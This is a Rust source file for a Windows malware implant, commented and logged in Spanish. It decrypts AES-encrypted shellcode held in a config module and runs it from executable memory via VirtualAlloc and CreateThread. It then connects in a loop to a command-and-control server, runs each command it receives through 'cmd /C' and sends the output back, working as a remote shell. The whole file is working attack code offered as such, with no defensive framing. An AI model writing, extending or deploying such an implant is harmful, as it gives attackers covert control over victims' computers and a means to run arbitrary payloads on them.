// #![windows_subsystem = "windows"]

mod config;

use aes::Aes256;
use cbc::{cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit}, Decryptor};
use std::mem::transmute;
use std::ptr::copy;
use winapi::um::winnt::{PAGE_EXECUTE_READWRITE, MEM_COMMIT, MEM_RESERVE};
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winbase::INFINITE;
use winapi::shared::minwindef::DWORD;
use std::net::TcpStream;
use std::io::{Read, Write};
use std::process::Command;
use std::thread;
use std::time::Duration;

type Aes256CbcDec = Decryptor<Aes256>;

fn decrypt_shellcode() -> Vec<u8> {
    println!("DEBUG: Iniciando desencriptado de shellcode");
    let cipher = Aes256CbcDec::new_from_slices(config::KEY, config::IV).unwrap();
    let mut buffer = config::ENCRYPTED_SHELLCODE.to_vec();
    let result = cipher.decrypt_padded_mut::<Pkcs7>(&mut buffer).unwrap().to_vec();
    println!("DEBUG: Shellcode desencriptado exitosamente, {} bytes", result.len());
    result
}

fn execute_shellcode() {
    println!("DEBUG: Ejecutando shellcode en hilo separado");
    unsafe {
        let shellcode = decrypt_shellcode();

        println!("DEBUG: Asignando memoria ejecutable para {} bytes", shellcode.len());
        let mem = VirtualAlloc(
            std::ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if mem.is_null() {
            println!("DEBUG: Error - No se pudo asignar memoria");
            return;
        }

        println!("DEBUG: Copiando shellcode a memoria ejecutable");
        copy(shellcode.as_ptr(), mem.cast::<u8>(), shellcode.len());

        println!("DEBUG: Creando hilo para ejecutar shellcode");
        let func: extern "system" fn() -> DWORD = transmute(mem);
        let thread = CreateThread(
            std::ptr::null_mut(),
            0,
            Some(transmute(func as *const ())),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );

        if !thread.is_null() {
            println!("DEBUG: Esperando a que termine el shellcode");
            WaitForSingleObject(thread, INFINITE);
            println!("DEBUG: Shellcode terminó");
        } else {
            println!("DEBUG: Error - No se pudo crear hilo para shellcode");
        }
    }
}

fn execute_command(cmd: &str) -> String {
    println!("DEBUG: Ejecutando comando: '{}'", cmd);
    let output = Command::new("cmd")
        .args(&["/C", cmd])
        .output();
    
    match output {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            
            if !stdout.is_empty() {
                println!("DEBUG: Comando exitoso, {} bytes de salida", stdout.len());
                stdout.to_string()
            } else if !stderr.is_empty() {
                println!("DEBUG: Comando con error, {} bytes de stderr", stderr.len());
                stderr.to_string()
            } else {
                println!("DEBUG: Comando sin salida");
                "Comando ejecutado sin salida".to_string()
            }
        }
        Err(e) => {
            let error_msg = format!("Error ejecutando comando: {}", e);
            println!("DEBUG: {}", error_msg);
            error_msg
        }
    }
}

fn connect_to_c2() -> Result<(), Box<dyn std::error::Error>> {
    println!("DEBUG: Iniciando conexión C2 al servidor {}", config::C2_SERVER);
    
    loop {
        println!("DEBUG: Intentando conectar al servidor C2...");
        
        // Intentar conectar al servidor C2
        match TcpStream::connect(&config::C2_SERVER) {
            Ok(mut stream) => {
                println!("DEBUG: ✅ Conectado exitosamente al servidor C2");
                
                // Configurar timeouts
                if let Err(e) = stream.set_read_timeout(Some(Duration::from_secs(30))) {
                    println!("DEBUG: Advertencia - No se pudo configurar read timeout: {}", e);
                }
                if let Err(e) = stream.set_write_timeout(Some(Duration::from_secs(10))) {
                    println!("DEBUG: Advertencia - No se pudo configurar write timeout: {}", e);
                }
                
                // Buffer para recibir comandos
                let mut buffer = vec![0u8; 4096];
                
                loop {
                    println!("DEBUG: Esperando comando del servidor...");
                    
                    // Limpiar buffer
                    buffer.fill(0);
                    
                    match stream.read(&mut buffer) {
                        Ok(0) => {
                            println!("DEBUG: ❌ Servidor cerró la conexión");
                            break;
                        }
                        Ok(n) => {
                            println!("DEBUG: 📨 Recibidos {} bytes del servidor", n);
                            let command = String::from_utf8_lossy(&buffer[..n]).trim().to_string();
                            println!("DEBUG: Comando recibido: '{}'", command);
                            
                            if command.is_empty() {
                                println!("DEBUG: Comando vacío, ignorando");
                                continue;
                            }
                            
                            // Ejecutar el comando
                            let result = execute_command(&command);
                            println!("DEBUG: Resultado del comando ({} bytes): {}", result.len(), 
                                if result.len() > 100 { format!("{}...", &result[..100]) } else { result.clone() });
                            
                            // Enviar el resultado de vuelta al servidor
                            println!("DEBUG: 📤 Enviando respuesta al servidor...");
                            match stream.write_all(result.as_bytes()) {
                                Ok(_) => {
                                    println!("DEBUG: Datos escritos, haciendo flush...");
                                    match stream.flush() {
                                        Ok(_) => {
                                            println!("DEBUG: ✅ Respuesta enviada exitosamente");
                                        }
                                        Err(e) => {
                                            println!("DEBUG: ❌ Error en flush: {}", e);
                                            break;
                                        }
                                    }
                                }
                                Err(e) => {
                                    println!("DEBUG: ❌ Error enviando respuesta: {}", e);
                                    break;
                                }
                            }
                        }
                        Err(e) => {
                            println!("DEBUG: ❌ Error leyendo del servidor: {}", e);
                            break;
                        }
                    }
                }
            }
            Err(e) => {
                println!("DEBUG: ❌ Error conectando al servidor: {}", e);
                println!("DEBUG: Esperando 5 segundos antes de reintentar...");
                thread::sleep(Duration::from_secs(5));
            }
        }
        
        println!("DEBUG: Conexión perdida, reintentando en 5 segundos...");
        thread::sleep(Duration::from_secs(5));
    }
}

fn main() {
    println!("DEBUG: 🚀 Agente iniciado");
    println!("DEBUG: Servidor C2 configurado: {}", config::C2_SERVER);
    
    // Ejecutar shellcode en un hilo separado (opcional)
    thread::spawn(|| {
        execute_shellcode();
    });
    
    // Pequeña pausa para que el shellcode se inicie
    println!("DEBUG: Esperando 2 segundos antes de conectar al C2...");
    thread::sleep(Duration::from_millis(2000));
    
    // Conectar al servidor C2 (bucle principal)
    println!("DEBUG: Iniciando bucle principal de conexión C2");
    if let Err(e) = connect_to_c2() {
        println!("DEBUG: ❌ Error fatal en conexión C2: {}", e);
    }
}
